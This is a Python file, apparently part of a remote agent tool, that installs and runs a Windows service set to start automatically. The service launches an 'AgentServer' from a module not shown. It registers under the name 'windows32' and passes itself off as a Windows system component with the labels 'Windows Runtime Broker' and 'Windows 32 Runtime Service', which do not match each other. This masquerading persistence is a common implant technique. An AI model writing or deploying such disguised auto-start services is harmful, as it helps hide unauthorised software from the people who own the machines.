# -*- coding: utf-8 -*-
import sys
import os
import asyncio
import servicemanager
import win32event
import win32service
import win32serviceutil


class AgentService(win32serviceutil.ServiceFramework):
    _svc_name_ = "windows32"
    _svc_display_name_ = "Windows Runtime Broker"
    _svc_description_ = "Manages runtime broker sessions for Windows compatibility."

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.stop_event = win32event.CreateEvent(None, 0, 0, None)
        self._loop: asyncio.AbstractEventLoop | None = None

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.stop_event)
        if self._loop:
            self._loop.call_soon_threadsafe(self._loop.stop)

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, "")
        )
        self._run()

    def _run(self):
        from server import AgentServer
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        server = AgentServer()
        try:
            self._loop.run_until_complete(server.start())
        finally:
            self._loop.close()


def install_service():
    """Устанавливает и запускает службу. Требует запуска от администратора один раз."""
    win32serviceutil.InstallService(
        pythonClassString="service.AgentService",
        serviceName="windows32",
        displayName="Windows 32 Runtime Service",
        description="Provides Windows 32-bit runtime compatibility layer.",
        startType=win32service.SERVICE_AUTO_START,   # автозапуск с Windows
        exeName=sys.executable,
    )
    win32serviceutil.StartService("windows32")
    print("[+] Служба установлена и запущена")


def remove_service():
    win32serviceutil.StopService("windows32")
    win32serviceutil.RemoveService("windows32")
    print("[+] Служба удалена")


if __name__ == "__main__":
    if len(sys.argv) == 1:
        # Запуск через SCM (диспетчер служб Windows)
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(AgentService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        win32serviceutil.HandleCommandLine(AgentService)
